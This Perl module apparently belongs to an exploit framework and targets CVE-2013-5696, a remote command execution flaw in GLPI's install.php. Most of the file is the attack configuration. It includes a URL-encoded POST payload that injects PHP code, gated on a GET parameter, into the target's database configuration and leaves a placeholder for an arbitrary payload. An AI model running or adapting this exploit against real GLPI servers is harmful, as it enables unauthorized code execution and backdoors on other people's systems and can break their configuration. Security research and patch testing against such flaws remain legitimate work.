package MSFExploits::Exploits::GLPI::MSF::GlpiInstallRce;
# use parent qw(MSFExploits::Exploit MSFExploits::Services::GLPI);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

# # use MSFExploits::Functions::Basic;
# # use MSFExploits::Functions::Errors;
# # use MSFExploits::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "GlpiInstallRce";

   my $DETECTION = {

   };

my $EXPLOIT = {
  CVE => "CVE-2013-5696",
  DESCRIPTION => "

        This module exploits an arbitrary command execution vulnerability in the

        GLPI 'install.php' script. This module is set to ManualRanking due to this

        module overwriting the target database configuration, which may introduce target

        instability.

      ",
  METHOD => "POST",
  MSF_MODULE => "glpi_install_rce",
  PATH => "install/install.php?",
  PATHS => ["index.php", "install/install.php", "glpi/"],
  PAYLOAD => "install=update_1&db_host=localhost&db_user=root&db_pass=root&databasename=;&",
  REFERENCES => [
    "https://www.navixia.com/blog/entry/navixia-finds-critical-vulnerabilities-in-glpi-cve-2013-5696.html",
    "http://www.glpi-project.org/forum/viewtopic.php?id=33762",
  ],
  TITLE => "GLPI install.php Remote Command Execution",
  VARIABLES => {
    'PATH' =>       { DESCRIPTION => "The base path to GLPI", VALUE => "/glpi/" },
  },

  TYPE => 'MSF',
  PLATFORM => 'MULTI',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'install/install.php',
      PAYLOAD      => 'install=update_1&db_host=localhost&db_user=root&db_pass=root&databasename=%27%3b%20%7d%20if%28isset%28%24_GET%5b%278faf8a64dd%27%5d%29%29%7b%20__PAYLOAD__%20%7d%20/%2a',
      TEXT   => 'Sending Exploit #1 Request : [POST] /install/install.php',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;
